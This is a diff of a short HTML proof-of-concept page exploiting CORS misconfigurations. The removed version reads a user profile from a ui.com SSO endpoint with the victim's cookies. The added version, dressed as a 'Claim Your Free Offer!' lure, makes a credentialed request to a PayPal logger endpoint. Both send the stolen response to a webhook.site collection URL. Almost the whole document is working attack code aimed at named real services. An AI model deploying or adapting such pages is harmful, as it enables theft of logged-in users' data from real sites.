@@ -1,26 +1,22 @@
-<!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CORS Exploit</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Malicious Script</title>
 </head>
 <body>
-    <h1>Stealing User Data via CORS</h1>
-    <script>
-        fetch("https://sso.ui.com/api/sso/v1/user/self", {
-            method: "GET",
-            credentials: "include"
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log("Stolen Data:", data);
-            // Send the stolen data to an attacker's server
-            fetch("https://webhook.site/31f77ac0-e4dc-48c1-84e2-3c2dbd73a717", {
-                method: "POST",
-                body: JSON.stringify(data),
-                headers: { "Content-Type": "application/json" }
-            });
-        })
-        .catch(error => console.error("Exploit failed:", error));
-    </script>
+  <h1>Claim Your Free Offer!</h1>
+  <script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('POST', 'https://www.paypal.com/xoplatform/logger/api/logger?disableSetCookie=true', true);
+    req.withCredentials = true; // Send cookies with the request
+    req.send();
+    
+    function reqListener() {
+      // Exfiltrate sensitive data to an external server
+      location = 'https://webhook.site/31f77ac0-e4dc-48c1-84e2-3c2dbd73a717?data=' + encodeURIComponent(this.responseText);
+    }
+  </script>
 </body>
 </html>
